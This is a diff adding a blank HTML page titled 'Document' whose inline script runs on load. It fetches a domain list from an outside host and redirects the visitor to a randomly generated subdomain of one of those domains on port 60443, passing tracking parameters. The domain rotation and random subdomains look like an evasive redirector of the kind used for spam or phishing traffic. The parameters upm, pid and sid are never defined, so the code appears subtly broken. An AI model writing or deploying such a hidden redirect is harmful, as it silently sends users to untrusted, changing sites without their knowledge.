@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Document</title>
+</head>
+
+<body>
+  <script>
+    (
+      function () {
+        function randomStr(leng) {
+          let str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+          let strRes = '';
+          for (let i = str.length; i > 0; --i) {
+            strRes += str[Math.floor(Math.random() * str.length)]
+          }
+          return strRes.substring(0, leng);
+        }
+        let xhr = new XMLHttpRequest();
+        xhr.open('get', 'https://wsoss.lanjingyoupin.com/zjk/C7/pdms.json');
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4 && xhr.status === 200) {
+            let str = xhr.responseText;
+            let data = JSON.parse(str);
+            let domainsArr = data.domains
+            let domain = domainsArr[Math.floor(Math.random() * domainsArr.length)]
+            window.location.href = `https:\/\/${randomStr(12)}.${domain}:60443\/jpm?upm=${upm}&pid=${pid}&sid=${sid}`
+          }
+        };
+        xhr.send();
+
+      })()
+
+  </script>
+</body>
+
+</html>
